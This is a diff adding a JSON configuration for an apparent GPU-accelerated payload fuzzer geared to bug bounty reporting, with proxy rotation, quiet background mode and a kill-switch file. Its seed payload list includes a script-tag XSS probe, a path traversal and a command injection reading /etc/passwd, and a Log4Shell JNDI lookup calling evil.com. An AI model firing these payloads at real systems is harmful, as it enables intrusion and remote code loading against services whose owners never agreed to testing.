@@ -1,0 +1,36 @@
+{
+  "gpu_memory_fraction": 0.9,
+  "gpu_enabled": true,
+  "use_sli": false,
+  "payloads_per_second": 80000,
+  "mutation_rate": 0.1,
+  "use_gpu_mutation": true,
+  "proxy_rotation": true,
+  "proxy_timeout": 5,
+  "max_retries": 3,
+  "use_z3_filter": true,
+  "z3_timeout": 1,
+  "auto_submit": false,
+  "report_format": "hackerone",
+  "min_severity": "medium",
+  "learn_from_rejections": true,
+  "rejection_threshold": 3,
+  "quiet_mode": true,
+  "log_level": "WARNING",
+  "background_mode": true,
+  "killswitch_file": "kill.omega",
+  "check_killswitch_interval": 1,
+  "targets": [
+    "https://httpbin.org/get",
+    "https://jsonplaceholder.typicode.com/posts/1"
+  ],
+  "base_payloads": [
+    "test",
+    "<script>alert(1)</script>",
+    "../../etc/passwd",
+    "${jndi:ldap://evil.com/a}",
+    "; cat /etc/passwd"
+  ],
+  "hackerone_api_key": "",
+  "bugcrowd_api_key": ""
+}
